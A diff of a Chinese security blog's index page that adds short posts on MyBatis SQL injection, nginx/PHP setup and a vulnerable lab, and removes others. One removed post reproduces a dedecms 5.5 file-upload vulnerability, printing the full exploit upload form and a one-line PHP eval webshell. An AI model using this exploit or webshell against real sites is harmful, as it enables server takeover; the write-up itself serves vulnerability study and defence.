@@ -40,7 +40,7 @@
         
           <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
@@ -72,6 +72,291 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-mybatis常见sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/01/02/mybatis常见sql注入/" class="article-date">
+  <time datetime="2019-01-02T03:44:56.000Z" itemprop="datePublished">2019-01-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/01/02/mybatis常见sql注入/">mybatis常见sql注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- Table of Contents -->
+        
+        <p>mybatis用的非常广阔。</p>
+<p>主要是$符号与#符号的使用</p>
+<p>容易使用$符号的功能场景，like，in，order by</p>
+<p>为什么这些场景容易出现？</p>
+<ul>
+<li>未认识到危害的错误写法</li>
+<li>generator<br>产生order by的都是$写法，要特别注意。</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/01/02/mybatis常见sql注入/" data-id="cjqenkuo1000k9wx73fcpppa3" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+ 
+
+
+  
+    <article id="post-windows系统配置nginx-php" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/11/30/windows系统配置nginx-php/" class="article-date">
+  <time datetime="2018-11-30T06:29:18.000Z" itemprop="datePublished">2018-11-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/30/windows系统配置nginx-php/">windows系统配置nginx+php</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- Table of Contents -->
+        
+        <p>下载nginx，修改nginx.config配置文件第65行位置，监听phpcgi：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">location ~ \.php$ &#123;</div><div class="line">​            root           html;</div><div class="line">​            fastcgi_pass   127.0.0.1:9000;</div><div class="line">​            fastcgi_index  index.php;</div><div class="line"></div><div class="line">            #fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</div><div class="line">​			fastcgi_param  SCRIPT_FILENAME $document_root$fastcgi_script_name;</div><div class="line">​            include        fastcgi_params;</div><div class="line">​        &#125;</div><div class="line"></div></pre></td></tr></table></figure>
+<p>启动phpcgi，监听9000端口</p>
+<p>​    php-cgi.exe -b 127.0.0.1:9000 -c php.ini</p>
+<p>启动nginx</p>
+<p>关闭运行的nginx</p>
+<p>​    taskkill  /F /IM nginx.exe</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/11/30/windows系统配置nginx-php/" data-id="cjqenkups00129wx735lpcow1" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+ 
+
+
+  
+    <article id="post-zvuldrill靶场" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/11/14/zvuldrill靶场/" class="article-date">
+  <time datetime="2018-11-14T12:20:08.000Z" itemprop="datePublished">2018-11-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/14/zvuldrill靶场/">zvuldrill靶场</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- Table of Contents -->
+        
+        <h3 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h3><p>zvuldrill跟真实环境较为接近，难度也并不算高。作为DVWA入门之后练手的靶场，可以用来提高一下信心。</p>
+<p>下载地址<a href="https://github.com/710leo/ZVulDrill" target="_blank" rel="external">github link</a></p>
+<p>具体本地环境搭建当然是选择PHPStudy，配置sys目录下config文件夹中密码。</p>
+<p>使用自带的SqlFront建立数据库，导入sql文件，注意导入sql文件时候要选择utf-8文件格式。</p>
+<p>完成环境搭建后，按照about页面所示，开启关闭相关模块。</p>
+<h3 id="0x01-修改lib-php文件"><a href="#0x01-修改lib-php文件" class="headerlink" title="0x01 修改lib.php文件"></a>0x01 修改lib.php文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">function clean_input($dirty)&#123;</div><div class="line">    if (get_magic_quotes_gpc()) &#123;</div><div class="line">        $clean = mysql_real_escape_string(stripslashes($dirty));     </div><div class="line">    &#125;else&#123;</div><div class="line">        $clean = mysql_real_escape_string($dirty);  </div><div class="line">    &#125; </div><div class="line">    return $clean;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>mysql_real_escape_string函数报错，无法正常留言。原因是调用该函数时候需要在调用前连接一下数据库，看代码发现lib.php文件之前在config.php有连接数据库，不清楚具体的原因，因此在这个地方我们直接把mysql_real_escape_string修改为addslashes来保证可以正常留言。</p>
+<h3 id="0x02-靶场结构"><a href="#0x02-靶场结构" class="headerlink" title="0x02 靶场结构"></a>0x02 靶场结构</h3>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/11/14/zvuldrill靶场/" data-id="cjqenkupp000z9wx7kd98ldo0" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/靶场/">靶场</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+ 
+
+
+  
+    <article id="post-shadowsocks-ios-compile" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/11/13/shadowsocks-ios-compile/" class="article-date">
+  <time datetime="2018-11-13T01:40:49.000Z" itemprop="datePublished">2018-11-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/13/shadowsocks-ios-compile/">ios翻墙客户端</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- Table of Contents -->
+        
+        <h3 id="不折腾翻墙："><a href="#不折腾翻墙：" class="headerlink" title="不折腾翻墙："></a>不折腾翻墙：</h3><ul>
+<li>appstore里面的ssrConnectPro</li>
+<li>下载pp助手 安装shadowrocket</li>
+</ul>
+<h3 id="折腾下"><a href="#折腾下" class="headerlink" title="折腾下"></a>折腾下</h3><p>周末，同学说起来可以自己编译一个shadowsocks-ios装在手机上。这样开始了好几天的折腾</p>
+<h4 id="0x00-下载代码"><a href="#0x00-下载代码" class="headerlink" title="0x00 下载代码"></a>0x00 下载代码</h4><pre><code>https://github.com/shadowsocks/shadowsocks-iOS.git
+</code></pre><p>从github下载代码，然后切换git branch master切换分支到主分支，导入到xcode。或者直接利用xcode从github克隆。</p>
+<h4 id="0x01-修改description"><a href="#0x01-修改description" class="headerlink" title="0x01 修改description"></a>0x01 修改description</h4><p>Use of undeclared identifier ‘_description’; did you mean ‘description’?<br>解决方法：修改_description为_description_t，并在头文件加入</p>
+<pre><code>@property (nonatomic, strong, readonly) NSString *description_t;
+</code></pre><h4 id="0x02-openssl头文件"><a href="#0x02-openssl头文件" class="headerlink" title="0x02 openssl头文件"></a>0x02 openssl头文件</h4><p>xcode从之前版本取消了对openssl的引用，所以需要自己去添加头文件查找路径。<br>尝试了很多brew link或者ln的方式都没有解决问题，最后是直接修改的xcode的build setting，增加对openssl的查找路径。<br>配置路径时候，注意如何选择编译环境。xcode里面的项目文件太多，不太清楚哪一个是主项目工程，所以选择编译路径的时候，要特别注意。<br><img src="/2018/11/13/shadowsocks-ios-compile/xcode.jpg" alt="xcode.jpg" title=""></p>
+<h4 id="‘sodium-h’-file-not-found"><a href="#‘sodium-h’-file-not-found" class="headerlink" title="‘sodium.h’ file not found"></a>‘sodium.h’ file not found</h4><pre><code>$brew install cocoapods
+$cd shadowsocks-ios
+$pod init
+</code></pre><p>修改podfile（注意~&gt;符号，可以拷贝）</p>
+<pre><code>platform :ios, &apos;9.2&apos;
+pod &apos;libsodium&apos;, &apos;~&gt; 1.0.3&apos;
+</code></pre><p>之后在项目路径下执行pod install，需要等很长一段时间。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/11/13/shadowsocks-ios-compile/" data-id="cjqenkuph000v9wx7777hppmy" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/编程/">编程</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+ 
+
+
+  
+    <article id="post-shiyanbar-ctf-web" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/11/12/shiyanbar-ctf-web/" class="article-date">
+  <time datetime="2018-11-12T08:41:04.000Z" itemprop="datePublished">2018-11-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/12/shiyanbar-ctf-web/">shiyanbar_ctf_web</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- Table of Contents -->
+        
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/11/12/shiyanbar-ctf-web/" data-id="cjqenkup1000r9wx7ghh1vaja" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+ 
+
+
+  
+    <article id="post-google-hacking" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/11/11/google-hacking/" class="article-date">
+  <time datetime="2018-11-11T11:37:23.000Z" itemprop="datePublished">2018-11-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/11/google-hacking/">google_hacking</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- Table of Contents -->
+        
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/11/11/google-hacking/" data-id="cjqenkunq000e9wx7vz3s1ge4" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+ 
+
+
+  
     <article id="post-book-list" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/10/31/book-list/" class="article-date">
@@ -100,7 +385,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/10/31/book-list/" data-id="cjnynvpdc0004yax71aqreimy" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/10/31/book-list/" data-id="cjqenkumw00059wx7by2u2r4o" class="article-share-link">Share</a>
       
       
       
@@ -136,7 +421,7 @@
       
         <!-- Table of Contents -->
         
-        <h3 id="0x00综述"><a href="#0x00综述" class="headerlink" title="0x00综述"></a>0x00综述</h3><p>这本书还有一个副标题呢，用Python，更安全～然而也没看到书里面提到了多少的Python。整本书干活寥寥无几，章节行篇布局隔的挺远，看起来倒是舒服得很，半天时间就看完了。与其说Python，不如说跟DVWA结合的挺紧密的，挺多例子都是拿DVWA说事。</p>
+        <h3 id="0x00综述"><a href="#0x00综述" class="headerlink" title="0x00综述"></a>0x00综述</h3><p>这本书还有一个副标题呢，用Python，更安全～然而也没看到书里面提到了多少的Python。整本书干货寥寥无几，章节行篇布局隔的挺远，看起来倒是舒服得很，半天时间就看完了。与其说Python，不如说跟DVWA结合的挺紧密的，挺多例子都是拿DVWA说事。</p>
 <h3 id="0x01-两个工具命令分类"><a href="#0x01-两个工具命令分类" class="headerlink" title="0x01 两个工具命令分类"></a>0x01 两个工具命令分类</h3><h5 id="sqlmap参数说明"><a href="#sqlmap参数说明" class="headerlink" title="sqlmap参数说明"></a>sqlmap参数说明</h5><ul>
 <li>选项说明</li>
 <li>目标说明</li>
@@ -177,7 +462,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/10/31/11-python-secuity-fun/" data-id="cjnynw51g0000ylx7v1mzojjd" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/10/31/11-python-secuity-fun/" data-id="cjqenkumf00019wx7ogya3k91" class="article-share-link">Share</a>
       
       
       
@@ -232,11 +517,11 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/10/30/upload-labs/" data-id="cjnynvpeu000qyax7uhlnjxdi" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/10/30/upload-labs/" data-id="cjqenkupg000u9wx7dxmu0t4l" class="article-share-link">Share</a>
       
       
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/靶场学习-漏洞复现/">靶场学习 漏洞复现</a></li></ul>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/靶场/">靶场</a></li></ul>
 
     </footer>
   </div>
@@ -274,348 +559,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/10/28/picture-trojan-and-parsing-vuln/" data-id="cjnynvpeg000hyax7s5t34atb" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
- 
-
-
-  
-    <article id="post-windows-php-file-upload-1" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/10/28/windows-php-file-upload-1/" class="article-date">
-  <time datetime="2018-10-28T14:11:37.000Z" itemprop="datePublished">2018-10-28</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/28/windows-php-file-upload-1/">windows-php-file-uoload_1</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <!-- Table of Contents -->
-        
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/10/28/windows-php-file-upload-1/" data-id="cjnynvpes000oyax79dnfsec7" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
- 
-
-
-  
-    <article id="post-dede-select-soft-post-md" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/10/22/dede-select-soft-post-md/" class="article-date">
-  <time datetime="2018-10-22T08:36:32.000Z" itemprop="datePublished">2018-10-22</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/22/dede-select-soft-post-md/">dedecms5.5文件上传漏洞复现</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <!-- Table of Contents -->
-        
-        <h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>最近的从防火墙检测流量发现一大波webshell上传威胁告警，指向select_soft_post.php这个文件。查了一下发现是dedecms的一个任意文件上传漏洞，发生在5.5跟5.5final版本。</p>
-<h2 id="0x01-准备环境"><a href="#0x01-准备环境" class="headerlink" title="0x01 准备环境"></a>0x01 准备环境</h2><ul>
-<li>目前的环境<br>之前一直习惯用xampp，虽然xampp比较稳定，但不支持多版本，更适合做开发及搭建版本稳定的学习环境。做漏洞复现，我们需要PHP运行环境的各种版本，相比而言，phpstudy才是更加适合目前操作的机器。</li>
-<li>php dedecms5.5系统</li>
-<li>准备好的exp</li>
-</ul>
-<h2 id="0x02-动手搭建"><a href="#0x02-动手搭建" class="headerlink" title="0x02 动手搭建"></a>0x02 动手搭建</h2><p>下载phpstudy，解压安装到C盘根路径下，并开启，将dedecms5.5放到网站根路径</p>
-<pre><code>C:\phpStudy\PHPTutorial\WWW
-</code></pre><p>解压获取的dedecmsv55系统放到该路径下，访问install,逐步完成安全，可见如下界面</p>
-<img src="/2018/10/22/dede-select-soft-post-md/dedecms.png" alt="dedecms.png" title="">
-<p>至此，环境我们就准备好了，开始复现</p>
-<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>首先分析一下漏洞原因<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if(!isset($cfg_basedir))</div><div class="line">&#123;</div><div class="line">	include_once(dirname(__FILE__).&apos;/config.php&apos;);</div><div class="line">&#125;</div></pre></td></tr></table></figure><br>变量$cfg_basedir没有正确的初始化，如果设置了global_register=on，我们可以通过覆盖变量的方式，饶过身份认证和系统变量初始化文件。</p>
-<p>因此，这个漏洞的触发条件有两个，因为需要启动global_register,因此php的版本需要为5.2或者5.3，高版本的已经禁用了这个功能，这也是我们选择使用phpstudy来复现这个漏洞的原因。</p>
-<ul>
-<li>dedecms5.5版本</li>
-<li>php环境开启了global_register</li>
-</ul>
-<p>接下来我们可以通告大佬写的一个表单上传，表单form对应的链接需要修改对应站点域名，然后来上传webshell文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;Dedecms v55 RCE Exploit Codz By flyh4t&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body style=&quot;FONT-SIZE: 9pt&quot;&gt;---------- Dedecms v55 RCE Exploit Codz By flyh4t---------- &lt;br /&gt;&lt;br /&gt;</div><div class="line">&lt;form action=http://localhost:8888/dedecms/include/dialog/select_soft_post.php method=&apos;POST&apos; enctype=&quot;multipart/form-data&quot; name=&apos;myform&apos;&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;activepath&apos; value=&apos;/data/cache/&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;cfg_basedir&apos; value=&apos;../../&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;cfg_imgtype&apos; value=&apos;php&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;cfg_not_allowall&apos; value=&apos;txt&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;cfg_softtype&apos; value=&apos;php&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;cfg_mediatype&apos; value=&apos;php&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;f&apos; value=&apos;form1.enclosure&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;job&apos; value=&apos;upload&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;newname&apos; value=&apos;fly.php&apos; /&gt;</div><div class="line">Select U Shell &lt;input type=&apos;file&apos; name=&apos;uploadfile&apos; size=&apos;25&apos; /&gt;</div><div class="line">&lt;input type=&apos;submit&apos; name=&apos;sb1&apos; value=&apos;确定&apos; /&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;br /&gt;It&apos;s just a exp for the bug of Dedecms V55...&lt;br /&gt;</div><div class="line">Need register_globals = on...&lt;br /&gt;Fun the game,get a webshell at /data/cache/fly.php...&lt;br /&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
-<p>对应的webshell,一句话后门<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">eval($_POST[&quot;a&quot;]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
-<p>使用菜刀访问上传的webshell。</p>
-<img src="/2018/10/22/dede-select-soft-post-md/result.png" alt="result.png" title="">
-<h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><p>从漏洞产生条件上来看，可以关闭global_register功能，当然其他的方法也很多，比如禁止使用select_soft_post页面 </p>
-<h2 id="0x05-更多的利用"><a href="#0x05-更多的利用" class="headerlink" title="0x05 更多的利用"></a>0x05 更多的利用</h2>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/10/22/dede-select-soft-post-md/" data-id="cjnynvpe20009yax752p5gy3k" class="article-share-link">分享</a>
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dedecms-漏洞复现/">dedecms 漏洞复现</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
- 
-
-
-  
-    <article id="post-beginners‘python" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/05/21/beginners‘python/" class="article-date">
-  <time datetime="2018-05-21T15:36:24.000Z" itemprop="datePublished">2018-05-21</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/05/21/beginners‘python/">python之解放生产力</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <!-- Table of Contents -->
-        
-        <h3 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a>开篇</h3><p>廖雪峰的教程，有一个很好的地方，顺着教程能够看清Python的全部面貌。</p>
-<p>然而程序呢，并不是一个等所有知识点全学完了才可以动手写的事情。之前有过其他语言编程经验的人，往往在看过一遍语法的基础上就开始编程，只是简单的用法就能体现出”人生苦短，我用Python“的简洁高效，即使代码上依旧带有其他语言使用经验的编程风格。</p>
-<p>虽如此，进一步的学习，还是有必要的。</p>
-<pre><code>人生苦短 我用Python
-</code></pre><p>那么看看廖雪峰的教程提到了那些具有科技革命的高级特性。</p>
-<h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><p>什么是切片呢，就是我们可以通过正负值的下标已经跳跃长度来截取变量。</p>
-<p>逆置一个数组，曾经的写法可能是for循环中依此赋值，这个时候我们还要小心的处理下标，但是有了切片：<br>b = a[::-1]</p>
-<p>注意一个要点，就是切片并不在原来数据上操作，</p>
-<h3 id="列表生成式"><a href="#列表生成式" class="headerlink" title="列表生成式"></a>列表生成式</h3><p>主要用于for循环等批量生成列表的地方。<br>我们最熟悉的写法可能是</p>
-<pre><code>for i in range(100):
-    a.append(i)
-</code></pre><p>使用列表生成式</p>
-<pre><code>a = [i for i in range(100)]
-</code></pre><h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><p>什么是迭代器：就是边循环便计算的机制。<br>生成器解决了一个问题，可以大批量生成的对象，随用随取，省了空间。<br>注意与列表生成式子的区别，</p>
-<pre><code># 列表生成式
-a = [i for i in range(10)]
-# 生成器
-b = (i for i in range(10))
-</code></pre><p>上面的写法不需要初始化，可以直接使用next(g)来获取首位及下一位元素，更优雅的方式是使用for循环。</p>
-<p>另一种更优雅的用法 yield </p>
-<h3 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h3><p>迭代强调了一个抽象度更高的for-in循环模式。list，tuple等都可以使用，然后如果像同步使用下标数字来引用元素的话，我们可以使用enumerate函数</p>
-<pre><code>for i, value in enumerate([&apos;A&apos;, &apos;B&apos;, &apos;C&apos;]):
-    print(i, value)
-</code></pre><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><p>写程序的时候经常遇到的一个错误：<br>object is not iterable。可以使用for-in情况的对象必须是可迭代的。</p>
-<p>主要有两类：</p>
-<ul>
-<li><p>集合数据类型，如list、tuple、dict、set、str等；</p>
-</li>
-<li><p>generator，包括生成器和带yield的generator function。</p>
-</li>
-</ul>
-<p>那么，问题来了:如何判断是否对象可迭代？</p>
-<pre><code>from collections import Iterable
-isinstance([], Iterable)
-</code></pre><p>然而还有一个问题，可迭代与迭代器并不是一回事情。</p>
-<p>Python的Iterator对象表示的是一个数据流，Iterator对象可以被next()函数调用并不断返回下一个数据，直到没有数据时抛出StopIteration错误。可以把这个数据流看做是一个有序序列，但我们却不能提前知道序列的长度，只能不断通过next()函数实现按需计算下一个数据，所以Iterator的计算是惰性的，只有在需要返回下一个数据时它才会计算。</p>
-<h3 id="Pyhton的高级函数编程"><a href="#Pyhton的高级函数编程" class="headerlink" title="Pyhton的高级函数编程"></a>Pyhton的高级函数编程</h3><p>记得最早写Javascript的时候，接触到函数式编程，每种语言都有自己的一等公民，熟练使用一类公民才算得上是接触到语言的核心风格。</p>
-<h4 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h4><ul>
-<li>map/reduce<br>惰性处理</li>
-<li>filter 结合迭代器的无限数据流惰性运算，求素数使用的filter简直不能更完美。</li>
-<li><p>sorted<br>可以指定比较的键函数<br>上面的函数从更加抽象，更加深层次的程度上优化了习惯的编程思维。总体来说，在需要的场合，通过对上面这些函数的使用能够替换原来臃肿的处理流程，并且逻辑上更加清晰，</p>
-</li>
-<li><p>返回函数</p>
-</li>
-</ul>
-<p>既然是函数式编程，也就是说函数能够作为参数来使用，这边有一个很重要的概念式闭包。</p>
-<ul>
-<li><p>匿名函数 lambda</p>
-</li>
-<li><p>装饰器</p>
-</li>
-</ul>
-<p>在函数之前或者之后执行某个操作，可以用来控制权限，写日志，绑定url和函数</p>
-<ul>
-<li>偏函数</li>
-</ul>
-<p>优化函数的参数</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/21/beginners‘python/" data-id="cjnynvpdf0005yax7z0ja36k5" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
- 
-
-
-  
-    <article id="post-CodeAudit" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/05/12/CodeAudit/" class="article-date">
-  <time datetime="2018-05-12T12:50:02.000Z" itemprop="datePublished">2018-05-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/05/12/CodeAudit/">CodeAudit</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <!-- Table of Contents -->
-        
-        <p><img src="https://upload-images.jianshu.io/upload_images/2303859-2c0c209d7d76a685.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="PHP代码审计学习笔记"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/12/CodeAudit/" data-id="cjnynvpd20002yax74p2xhk45" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
- 
-
-
-  
-    <article id="post-Web-Scanner" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/05/12/Web-Scanner/" class="article-date">
-  <time datetime="2018-05-12T12:40:39.000Z" itemprop="datePublished">2018-05-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/05/12/Web-Scanner/">Web扫描器</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <!-- Table of Contents -->
-        
-        <p><img src="https://upload-images.jianshu.io/upload_images/2303859-ecb8a2ee444a5764.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="WebScanner.jpg"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/12/Web-Scanner/" data-id="cjnynvpcl0000yax7b9e32cm7" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
- 
-
-
-  
-    <article id="post-python-in-practice" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/04/16/python-in-practice/" class="article-date">
-  <time datetime="2018-04-16T15:40:23.000Z" itemprop="datePublished">2018-04-16</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
